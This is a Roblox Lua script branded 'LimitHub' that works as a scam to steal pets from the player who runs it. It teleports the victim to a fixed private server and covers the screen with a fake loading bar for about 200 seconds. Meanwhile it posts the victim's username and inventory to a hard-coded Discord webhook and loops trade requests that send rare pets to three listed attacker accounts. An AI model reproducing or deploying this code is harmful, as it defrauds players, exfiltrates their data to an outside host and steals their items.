-- Roblox Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"

-- Targeted Pets
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

warn("[LimitHub] ✅ Starting script...")

-- Step 1: Teleport to private server
local placeId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"

task.spawn(function()
    task.wait(2)
    warn("[LimitHub] 🔁 Attempting to teleport to private server...")
    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
end)

-- Step 2: Wait for game to finish loading
game.Loaded:Wait()
task.wait(5)
warn("[LimitHub] ✅ Teleport complete. Game loaded.")

-- Step 3: Show Custom GUI
task.spawn(function()
    warn("[LimitHub] ✅ Showing custom loading GUI...")
    local screenGui = Instance.new("ScreenGui", game.CoreGui)
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false

    local bg = Instance.new("Frame")
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Text = "LIMIT HUB"
    title.Font = Enum.Font.SciFi
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeTransparency = 0.2
    title.TextScaled = true
    title.Size = UDim2.new(0, 600, 0, 100)
    title.Position = UDim2.new(0.5, -300, 0.5, -160)
    title.BackgroundTransparency = 1
    title.Parent = bg

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 400, 0, 30)
    bar.Position = UDim2.new(0.5, -200, 0.5, -30)
    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    bar.BorderSizePixel = 0
    bar.Parent = bg

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    fill.BorderSizePixel = 0
    fill.Parent = bar

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(0, 100, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.TextStrokeTransparency = 0.3
    percentLabel.Font = Enum.Font.SciFi
    percentLabel.TextScaled = true
    percentLabel.Parent = bg

    local loadingText = Instance.new("TextLabel")
    loadingText.Text = "LOADING"
    loadingText.Size = UDim2.new(0, 400, 0, 70)
    loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeTransparency = 0.2
    loadingText.Font = Enum.Font.SciFi
    loadingText.TextScaled = true
    loadingText.Parent = bg

    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(10)
    end
    task.wait(1)
    screenGui:Destroy()
    warn("[LimitHub] ✅ GUI finished loading.")
end)

-- Step 4: Webhook to Discord
task.delay(8, function()
    warn("[LimitHub] 📡 Sending inventory data to Discord...")
    local function getInventory()
        local data = {
            items = {},
            rarePets = {}
        }

        local foldersToCheck = {
            LocalPlayer:FindFirstChild("Pets"),
            LocalPlayer:FindFirstChild("Backpack"),
            LocalPlayer:FindFirstChildOfClass("Folder")
        }

        for _, folder in ipairs(foldersToCheck) do
            if folder then
                for _, item in ipairs(folder:GetChildren()) do
                    table.insert(data.items, item.Name)
                    if table.find(targetedPets, item.Name) then
                        table.insert(data.rarePets, item.Name)
                    end
                end
            end
        end

        return data
    end

    local inv = getInventory()
    local body = {
        username = "LimitHub Logger",
        embeds = {{
            title = "🚨 New Target Logged",
            description = "**Username:** " .. LocalPlayer.Name ..
                "\n**All Items:** " .. table.concat(inv.items, ", ") ..
                "\n**Rare Pets:** " .. table.concat(inv.rarePets, ", "),
            color = 16776960
        }}
    }

    local success, response = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(body)
        })
    end)

    if success then
        warn("[LimitHub] ✅ Webhook sent successfully.")
    else
        warn("[LimitHub] ❌ Failed to send webhook:", response)
    end
end)

-- Step 5: Auto-transfer pets
task.spawn(function()
    local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
    warn("[LimitHub] 🔄 Starting pet transfer loop...")
    while true do
        for _, p in pairs(Players:GetPlayers()) do
            if table.find(attackers, p.Name) then
                local args = {
                    [1] = p.Name,
                    [2] = {}
                }

                local petFolder = LocalPlayer:FindFirstChild("Pets")
                if petFolder then
                    for _, pet in pairs(petFolder:GetChildren()) do
                        if pet:IsA("Model") and table.find(targetedPets, pet.Name) then
                            table.insert(args[2], pet.Name)
                        end
                    end
                end

                local success, err = pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TradeInvitePlayer"):FireServer(unpack(args))
                end)

                if success then
                    warn("[LimitHub] ✅ Pets transferred to " .. p.Name)
                else
                    warn("[LimitHub] ⚠️ Pet transfer failed:", err)
                end
            end
        end
        task.wait(5)
    end
end)
